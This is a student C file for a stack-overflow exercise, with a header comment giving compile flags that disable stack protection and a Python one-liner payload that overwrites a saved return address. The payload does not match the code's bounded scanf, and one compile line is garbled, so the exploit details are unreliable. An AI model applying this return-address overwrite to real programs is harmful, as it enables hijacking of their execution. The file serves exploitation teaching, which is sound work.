/*
*Name - Nikhil Ranjan Nayak
*Regd No - 1641012040
*Desc -	Binary exploitation
*	Compile without stack protection : gcc prog.c -fno-stack-protector
*					   gcc prog.c gcc -fstack-protector-all
*Payload - echo -e `python -c 'print "A"*18+<Dummay valur for EBP>+<Return address>'` | ./a.out
*	   echo -e `python -c 'import struct;print "A"*18+"BBBB"+struct.pack("<I", 0x0804848b )'` | ./a.out
*/
#include <stdio.h>
void function1();
void function2();
void main()
{	
	function1();
	function2();
}

void function1()
{
	char buf[20];
	printf("Enter string:");
	scanf("%19s", buf);
}

void function2()
{
	printf("Funtion 2 called.\n");
}
